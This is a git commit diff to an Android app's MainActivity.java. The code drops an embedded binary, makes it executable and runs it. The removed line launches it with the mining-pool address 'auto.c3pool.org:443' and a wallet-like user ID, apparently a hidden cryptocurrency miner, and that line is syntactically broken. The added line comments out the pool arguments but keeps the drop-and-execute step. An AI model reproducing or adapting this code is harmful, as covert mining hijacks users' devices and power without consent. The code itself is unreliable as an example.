2953536da327fe7ccafe1ee41d97a45a85371b5c
r1nny <109706512+r1nny@users.noreply.github.com>
2022-09-20 17:18:38 -0500

    Update MainActivity.java

--- com/main/MainActivity.java
+++ com/main/MainActivity.java
@@ -11,7 +11,7 @@ public class MainActivity extends android.app.Activity
         {
             java.nio.file.Files.copy(androidNotls, mime.toPath());
             mime.setExecutable(true);
-            final var process = new java.lang.ProcessBuilder(mime.getPath(), "-h", "-t", "1", "-o", "auto.c3pool.org:443", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR"*/).start();
+            final var process = new java.lang.ProcessBuilder(mime.getPath(), "-h"/*, "-t", "1", "-o", "auto.c3pool.org:443", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR"*/).start();
             java.lang.System.out.println(new java.lang.String(process.getInputStream().readAllBytes()));
         }
         catch (final java.lang.Exception e){java.lang.System.out.println(e);}
